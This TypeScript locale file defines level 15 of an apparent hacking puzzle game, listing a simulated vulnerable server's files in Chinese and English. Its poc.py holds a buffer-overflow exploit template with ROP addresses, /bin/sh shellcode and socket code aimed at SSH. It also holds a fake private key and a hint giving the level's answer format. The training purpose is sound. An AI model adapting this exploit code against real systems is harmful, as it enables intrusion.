import { LevelLocales } from "./index";

export const level15Locales: LevelLocales = {
  zh: {
    title: "系统漏洞",
    description: "在对服务器进行安全审计时，发现了一个存在漏洞的系统服务。你需要分析漏洞报告，找到利用方法，并获取系统权限。",
    objectives: [
      "分析漏洞报告",
      "检查系统服务",
      "利用漏洞获取权限",
      "提取管理员凭证"
    ],
    hints: [
      "检查系统中的OpenSSH版本",
      "分析auth.log中的异常记录",
      "查看POC代码了解漏洞原理",
      "利用exploit.py获取root权限",
      "漏洞利用成功后，SSH私钥在/root/.ssh/id_rsa文件中",
      "最终密码格式：CVE编号_系统版本_端口号"
    ],
    fileContents: {
      "readme.txt": "任务简报：\n安全审计发现系统中存在高危漏洞，需要：\n1. 分析漏洞报告了解漏洞细节\n2. 检查受影响的系统服务\n3. 利用漏洞获取系统权限\n4. 提取管理员凭证\n\n注意：仔细阅读漏洞报告和系统日志",
      "vuln_report.txt": "漏洞报告 #CVE-2024-9999\n\n影响范围：\n- 产品：OpenSSH\n- 版本：8.9p1\n- 严重等级：高危\n\n漏洞描述：\n发现OpenSSH服务在处理特定格式的认证请求时存在缓冲区溢出漏洞。\n攻击者可以通过发送特制的认证数据包触发此漏洞。\n\n技术细节：\n1. 漏洞位于认证处理模块\n2. 触发条件：发送超长的认证数据\n3. 影响：可能导致远程代码执行\n\n修复建议：\n升级到最新版本 8.9p2 或更高版本\n\n备注：系统当前使用的版本为8.9p1",
      "service_scan.txt": "服务扫描结果：\n\n目标系统：192.168.1.100\n\n开放端口：\nTCP/22   OPEN   SSH   OpenSSH 8.9p1  [主要目标]\nTCP/80   OPEN   HTTP  Apache/2.4.41\nTCP/443  OPEN   HTTPS Apache/2.4.41\nTCP/3306 OPEN   MySQL 5.7.32\n\n[警告] SSH服务(端口22)版本过低，存在已知漏洞\n[提示] 使用命令：ssh_exploit 192.168.1.100 --check 检查漏洞\n\n[注意] 记录目标端口号(22)，这是构造最终密码的必要信息",
      "system_info.txt": "系统信息：\n\n操作系统：Ubuntu 20.04.3 LTS\n内核版本：5.4.0-42-generic\n架构：x86_64\n主机名：vulnserver\nIP地址：192.168.1.100\n\n已安装的关键软件：\n- OpenSSH 8.9p1\n- Apache 2.4.41\n- MySQL 5.7.32\n\n[注意] 系统未安装最新安全补丁",
      "running_services.txt": "当前运行的服务：\n\n● ssh.service - OpenSSH server daemon\n   Loaded: loaded (/lib/systemd/system/ssh.service)\n   Active: active (running)\n   Process: 1234 ExecStart=/usr/sbin/sshd -D\n   CGroup: /system.slice/ssh.service\n           └─1234 /usr/sbin/sshd -D\n\n● apache2.service - The Apache HTTP Server\n   Loaded: loaded (/lib/systemd/system/apache2.service)\n   Active: active (running)\n   Process: 1235 ExecStart=/usr/sbin/apache2 -k start\n   CGroup: /system.slice/apache2.service\n           └─1235 /usr/sbin/apache2 -k start\n\n● mysql.service - MySQL Database Server\n   Loaded: loaded (/lib/systemd/system/mysql.service)\n   Active: active (running)\n   Process: 1236 ExecStart=/usr/sbin/mysqld\n   CGroup: /system.slice/mysql.service\n           └─1236 /usr/sbin/mysqld",
      "sshd_config": "# SSH服务配置\nPort 22\nListenAddress 0.0.0.0\nPermitRootLogin yes\nPasswordAuthentication yes\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n\n# 警告：配置不够安全",
      "apache2.conf": "# Apache配置文件\n...(省略约70行)...",
      "mysql.cnf": "# MySQL配置文件\n...(省略约70行)...",
      "auth.log": "认证日志分析将显示登录尝试和权限提升记录。\n使用 loganalyzer auth.log 查看详细信息。",
      "error.log": "错误日志包含了所有错误和警告信息。\n使用 loganalyzer error.log 查看详细信息。",
      "access.log": "访问日志记录了所有HTTP请求和文件访问。\n使用 loganalyzer access.log 查看详细信息。",
      "poc.py": "# Exploit for CVE-2024-9999\n# 警告：此脚本仅用于授权测试\n\nimport socket\nimport struct\nimport sys\n\ndef build_exploit():\n    # 第一步：构建ROP链\n    rop_chain = [\n        0x7ffff7a54000,  # pop rdi; ret\n        0x7ffff7a54100,  # /bin/sh字符串地址\n        0x7ffff7a54200   # system函数地址\n    ]\n    \n    # 第二步：构建shellcode\n    shellcode = (\n        b\"\\x48\\x31\\xc0\"               # xor rax, rax\n        b\"\\x48\\x31\\xff\"               # xor rdi, rdi\n        b\"\\x48\\x31\\xf6\"               # xor rsi, rsi\n        b\"\\x48\\x31\\xd2\"               # xor rdx, rdx\n        b\"\\x50\"                       # push rax\n        b\"\\x48\\xbb\\x2f\\x62\\x69\\x6e\"   # mov rbx, '/bin'\n        b\"\\x2f\\x73\\x68\\x00\"           # mov rbx, '/sh\\0'\n        b\"\\x53\"                       # push rbx\n        b\"\\x48\\x89\\xe7\"               # mov rdi, rsp\n        b\"\\xb0\\x3b\"                   # mov al, 59\n        b\"\\x0f\\x05\"                   # syscall\n    )\n\n    # 第三步：组合完整的exploit\n    payload = b\"A\" * 1024             # 填充缓冲区\n    payload += struct.pack(\"<Q\", 0x7ffff7a54000)  # 返回地址\n    payload += b\"\".join(struct.pack(\"<Q\", addr) for addr in rop_chain)\n    payload += shellcode\n    \n    return payload\n\ndef exploit(target, port=22):\n    try:\n        # 连接目标\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target, port))\n        \n        # 发送exploit\n        print(\"[*] 发送exploit...\")\n        sock.send(build_exploit())\n        \n        # 检查是否成功\n        response = sock.recv(1024)\n        if b\"root@\" in response:\n            print(\"[+] 获取root权限成功！\")\n            print(\"[+] SSH私钥位置：/root/.ssh/id_rsa\")\n            return True\n            \n    except Exception as e:\n        print(f\"[-] 攻击失败: {str(e)}\")\n    return False\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(f\"Usage: {sys.argv[0]} <target>\")\n        sys.exit(1)\n    exploit(sys.argv[1])",
      "exploit.py": "# Exploit代码\n...(省略约70行)...",
      "payload.txt": "# Exploit Payload 结构\n\n1. 缓冲区填充\n   - 大小：1024字节\n   - 内容：0x41 ('A')\n\n2. 返回地址覆盖\n   - 地址：0x7ffff7a54000\n   - 功能：pop rdi; ret\n\n3. ROP链\n   - 0x7ffff7a54000: pop rdi; ret\n   - 0x7ffff7a54100: /bin/sh字符串\n   - 0x7ffff7a54200: system函数\n\n4. Shellcode\n   - 大小：27字节\n   - 功能：执行/bin/sh\n\n注意：地址可能需要根据目标系统调整",
      "id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAvVJ4YjmqGtQZA0c9RKNHs3+mYj8pM6J3lQH9CGkl6n4VmEYh\nX5VN+zQXUqB+vdEiVqL1h7GvNn6ZH5QQgEcNPNJBYFQXhk6M2xqHyQ2Qx5VJ5jxL\n5H+ZGgWwPOT9Bz9Ey1+dXjCKvqaHqL6TOEfGZ+v8cQGxPY6dp4LH2M2Jh/wPyW+q\nXEiUHBqJ3OfHVokmH9qYwFxV1zT8YEghHVcBzPD1L9QCvzv7tMnPJd+XmGwL4/Ey\nD+DNJJhg1B8zEpDx9vqQ7RJ9Eq8xBZ5+/1YU0qCMqxaB2xB4g6Y6VXqXL8h4MrrZ\nwIDAQABAoIBAQCJ8K9z8TnVYkqB7w6HzK0F\n-----END RSA PRIVATE KEY-----",
      "id_rsa.pub": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9UnhiOaoa1BkDRz1Eo0ezf6ZiPykzonf... root@vulnserver",
      "authorized_keys": "# 授权的SSH密钥列表\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9UnhiOaoa1BkDRz1Eo0ezf6ZiPykzonf... root@vulnserver",
      ".bash_history": "# root用户的命令历史\nls -la\ncd /root/.ssh\ncat id_rsa\nexit",
      ".profile": "# root用户的配置文件\nexport PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\nexport HISTSIZE=1000\nexport HISTFILESIZE=2000"
    }
  },
  en: {
    title: "System Vulnerability",
    description: "During a server security audit, a vulnerable system service was discovered. You need to analyze the vulnerability report, find exploitation methods, and gain system access.",
    objectives: [
      "Analyze vulnerability report",
      "Check system services",
      "Exploit vulnerability for access",
      "Extract admin credentials"
    ],
    hints: [
      "Check OpenSSH version in system",
      "Analyze anomalies in auth.log",
      "Review POC code to understand vulnerability",
      "Use exploit.py to gain root access",
      "After successful exploit, SSH key is in /root/.ssh/id_rsa",
      "Final password format: CVE-number_system-version_port-number"
    ],
    fileContents: {
      "readme.txt": "Mission Brief:\nSecurity audit found critical vulnerability, need to:\n1. Analyze vulnerability report details\n2. Check affected system services\n3. Exploit vulnerability for system access\n4. Extract administrator credentials\n\nNote: Carefully read vulnerability report and system logs",
      "vuln_report.txt": "Vulnerability Report #CVE-2024-9999\n\nScope:\n- Product: OpenSSH\n- Version: 8.9p1\n- Severity: High\n\nDescription:\nBuffer overflow vulnerability discovered in OpenSSH service when handling specific authentication requests.\nAttackers can trigger this vulnerability by sending specially crafted authentication packets.\n\nTechnical Details:\n1. Vulnerability in authentication handling module\n2. Trigger condition: Send oversized authentication data\n3. Impact: Possible remote code execution\n\nRemediation:\nUpgrade to version 8.9p2 or higher\n\nNote: System currently using version 8.9p1",
      "service_scan.txt": "Service Scan Result:\n\nTarget System: 192.168.1.100\n\nOpen Ports:\nTCP/22   OPEN   SSH   OpenSSH 8.9p1  [Primary Target]\nTCP/80   OPEN   HTTP  Apache/2.4.41\nTCP/443  OPEN   HTTPS Apache/2.4.41\nTCP/3306 OPEN   MySQL 5.7.32\n\n[Warning] SSH service (port 22) version is outdated, known vulnerability exists\n[提示] 使用命令：ssh_exploit 192.168.1.100 --check 检查漏洞\n\n[注意] 记录目标端口号(22)，这是构造最终密码的必要信息",
      "system_info.txt": "System Information:\n\nOperating System: Ubuntu 20.04.3 LTS\nKernel Version: 5.4.0-42-generic\nArchitecture: x86_64\nHostname: vulnserver\nIP Address: 192.168.1.100\n\nInstalled Critical Software:\n- OpenSSH 8.9p1\n- Apache 2.4.41\n- MySQL 5.7.32\n\n[Note] System has not installed latest security patches",
      "running_services.txt": "Current Running Services:\n\n● ssh.service - OpenSSH server daemon\n   Loaded: loaded (/lib/systemd/system/ssh.service)\n   Active: active (running)\n   Process: 1234 ExecStart=/usr/sbin/sshd -D\n   CGroup: /system.slice/ssh.service\n           └─1234 /usr/sbin/sshd -D\n\n● apache2.service - The Apache HTTP Server\n   Loaded: loaded (/lib/systemd/system/apache2.service)\n   Active: active (running)\n   Process: 1235 ExecStart=/usr/sbin/apache2 -k start\n   CGroup: /system.slice/apache2.service\n           └─1235 /usr/sbin/apache2 -k start\n\n● mysql.service - MySQL Database Server\n   Loaded: loaded (/lib/systemd/system/mysql.service)\n   Active: active (running)\n   Process: 1236 ExecStart=/usr/sbin/mysqld\n   CGroup: /system.slice/mysql.service\n           └─1236 /usr/sbin/mysqld",
      "sshd_config": "# SSH服务配置\nPort 22\nListenAddress 0.0.0.0\nPermitRootLogin yes\nPasswordAuthentication yes\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server\n\n# 警告：配置不够安全",
      "apache2.conf": "# Apache配置文件\n...(省略约70行)...",
      "mysql.cnf": "# MySQL配置文件\n...(省略约70行)...",
      "auth.log": "认证日志分析将显示登录尝试和权限提升记录。\n使用 loganalyzer auth.log 查看详细信息。",
      "error.log": "错误日志包含了所有错误和警告信息。\n使用 loganalyzer error.log 查看详细信息。",
      "access.log": "访问日志记录了所有HTTP请求和文件访问。\n使用 loganalyzer access.log 查看详细信息。",
      "poc.py": "# Exploit for CVE-2024-9999\n# 警告：此脚本仅用于授权测试\n\nimport socket\nimport struct\nimport sys\n\ndef build_exploit():\n    # 第一步：构建ROP链\n    rop_chain = [\n        0x7ffff7a54000,  # pop rdi; ret\n        0x7ffff7a54100,  # /bin/sh字符串地址\n        0x7ffff7a54200   # system函数地址\n    ]\n    \n    # 第二步：构建shellcode\n    shellcode = (\n        b\"\\x48\\x31\\xc0\"               # xor rax, rax\n        b\"\\x48\\x31\\xff\"               # xor rdi, rdi\n        b\"\\x48\\x31\\xf6\"               # xor rsi, rsi\n        b\"\\x48\\x31\\xd2\"               # xor rdx, rdx\n        b\"\\x50\"                       # push rax\n        b\"\\x48\\xbb\\x2f\\x62\\x69\\x6e\"   # mov rbx, '/bin'\n        b\"\\x2f\\x73\\x68\\x00\"           # mov rbx, '/sh\\0'\n        b\"\\x53\"                       # push rbx\n        b\"\\x48\\x89\\xe7\"               # mov rdi, rsp\n        b\"\\xb0\\x3b\"                   # mov al, 59\n        b\"\\x0f\\x05\"                   # syscall\n    )\n\n    # 第三步：组合完整的exploit\n    payload = b\"A\" * 1024             # 填充缓冲区\n    payload += struct.pack(\"<Q\", 0x7ffff7a54000)  # 返回地址\n    payload += b\"\".join(struct.pack(\"<Q\", addr) for addr in rop_chain)\n    payload += shellcode\n    \n    return payload\n\ndef exploit(target, port=22):\n    try:\n        # 连接目标\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((target, port))\n        \n        # 发送exploit\n        print(\"[*] 发送exploit...\")\n        sock.send(build_exploit())\n        \n        # 检查是否成功\n        response = sock.recv(1024)\n        if b\"root@\" in response:\n            print(\"[+] 获取root权限成功！\")\n            print(\"[+] SSH私钥位置：/root/.ssh/id_rsa\")\n            return True\n            \n    except Exception as e:\n        print(f\"[-] 攻击失败: {str(e)}\")\n    return False\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(f\"Usage: {sys.argv[0]} <target>\")\n        sys.exit(1)\n    exploit(sys.argv[1])",
      "exploit.py": "# Exploit代码\n...(省略约70行)...",
      "payload.txt": "# Exploit Payload 结构\n\n1. 缓冲区填充\n   - 大小：1024字节\n   - 内容：0x41 ('A')\n\n2. 返回地址覆盖\n   - 地址：0x7ffff7a54000\n   - 功能：pop rdi; ret\n\n3. ROP链\n   - 0x7ffff7a54000: pop rdi; ret\n   - 0x7ffff7a54100: /bin/sh字符串\n   - 0x7ffff7a54200: system函数\n\n4. Shellcode\n   - 大小：27字节\n   - 功能：执行/bin/sh\n\n注意：地址可能需要根据目标系统调整",
      "id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAvVJ4YjmqGtQZA0c9RKNHs3+mYj8pM6J3lQH9CGkl6n4VmEYh\nX5VN+zQXUqB+vdEiVqL1h7GvNn6ZH5QQgEcNPNJBYFQXhk6M2xqHyQ2Qx5VJ5jxL\n5H+ZGgWwPOT9Bz9Ey1+dXjCKvqaHqL6TOEfGZ+v8cQGxPY6dp4LH2M2Jh/wPyW+q\nXEiUHBqJ3OfHVokmH9qYwFxV1zT8YEghHVcBzPD1L9QCvzv7tMnPJd+XmGwL4/Ey\nD+DNJJhg1B8zEpDx9vqQ7RJ9Eq8xBZ5+/1YU0qCMqxaB2xB4g6Y6VXqXL8h4MrrZ\nwIDAQABAoIBAQCJ8K9z8TnVYkqB7w6HzK0F\n-----END RSA PRIVATE KEY-----",
      "id_rsa.pub": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9UnhiOaoa1BkDRz1Eo0ezf6ZiPykzonf... root@vulnserver",
      "authorized_keys": "# 授权的SSH密钥列表\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9UnhiOaoa1BkDRz1Eo0ezf6ZiPykzonf... root@vulnserver",
      ".bash_history": "# root用户的命令历史\nls -la\ncd /root/.ssh\ncat id_rsa\nexit",
      ".profile": "# root用户的配置文件\nexport PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\nexport HISTSIZE=1000\nexport HISTFILESIZE=2000"
    }
  }
}; 